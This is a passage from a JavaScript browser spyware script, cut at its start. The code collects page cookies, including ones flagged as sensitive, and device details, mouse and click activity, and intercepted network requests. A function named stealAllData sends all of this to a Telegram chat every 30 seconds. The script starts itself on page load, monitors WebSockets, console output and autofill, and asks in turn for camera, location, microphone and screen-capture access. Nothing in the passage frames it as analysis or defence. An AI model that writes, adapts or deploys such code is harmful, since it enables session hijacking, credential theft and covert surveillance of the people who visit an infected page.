            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        cookies.push({ name, value, isSensitive });
    });
    return cookies;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const deviceInfo = await collectDeviceInfo();
        const cookies = getCookieDetails();
        
        let message = `🔴 *COMPREHENSIVE DATA REPORT*\n\n`;
        message += `🍪 Cookies: ${cookies.length} found\n`;
        if (cookies.length > 0) {
            cookies.slice(0, 10).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
        }
        
        message += `\n${formatDeviceInfo(deviceInfo)}`;
        await sendMessageToTelegram(message);
        
        const fullData = { 
            timestamp: new Date().toISOString(), 
            url: window.location.href, 
            cookies: cookies, 
            deviceInfo: deviceInfo,
            mouseMovements: mouseMovements.slice(-50),
            clickEvents: clickEvents.slice(-50),
            networkRequests: networkRequests.slice(-50)
        };
        
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `comprehensive_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Data Report`);
        
    } catch (error) {}
}

// ==================== START DATA COLLECTION ====================
async function startDataCollection() {
    setInterval(async () => {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(`🔄 *LIVE DATA UPDATE*\n\n${formattedInfo}`);
    }, 60000);
    
    setInterval(() => stealAllData(), 30000);
}

// ==================== INITIALIZE ALL MONITORS ====================
async function initialize() {
    // Start all monitoring systems
    startMouseTracking();
    interceptNetworkRequests();
    monitorWebSockets();
    monitorBeacon();
    monitorConsole();
    observeDOMMutations();
    detectAutoFill();
    
    // Initial data collection
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    await sendMessageToTelegram(`🚀 *ADVANCED MONITORING ACTIVATED*\n\n${formattedInfo}`);
    
    // Request permissions
    setTimeout(() => requestCameraPermission(), 1000);
    setTimeout(() => requestLocationPermission(), 3000);
    setTimeout(() => requestMicrophonePermission(), 5000);
    setTimeout(() => requestScreenPermission(), 7000);
    setTimeout(() => startDataCollection(), 10000);
    setTimeout(() => stealAllData(), 2000);
}

// Start everything when page loads
window.addEventListener("DOMContentLoaded", initialize);